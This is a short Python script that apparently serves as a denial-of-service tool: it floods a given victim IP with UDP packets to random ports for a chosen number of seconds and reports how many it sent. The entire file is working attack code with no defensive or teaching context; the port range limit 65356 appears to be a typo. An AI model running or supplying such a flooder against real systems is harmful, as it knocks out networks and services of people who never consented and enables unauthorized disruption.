#!/usr/local/bin/python3.8

import time
import socket
import random
import sys


def usage():
	print(f"Usage: python3.8 {sys.argv[0]} <ip> <seconds of attack>")


def startAttack(victim_ip, duration):
	# open a socket
	# AF_INET is for IP communication
	# SOCK_DGRAM is for UDP packets
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

	msg = bytes(random.getrandbits(10))
	timeout = time.time() + duration
	sent_packets = 0

	print(f"Attacking {victim_ip} for {duration} seconds")

	while time.time() < timeout:
		victim_port = random.randint(1025, 65356)
		# send packet
		# destination is a pair ip-port
		sock.sendto(msg, (victim_ip, victim_port))
		sent_packets += 1

	print(f"Attack finished. Sent {sent_packets} packets.")


def main():
	if len(sys.argv) != 3:
		usage()
		exit(1)

	startAttack(sys.argv[1], int(sys.argv[2]))


if __name__ == '__main__':
	main()
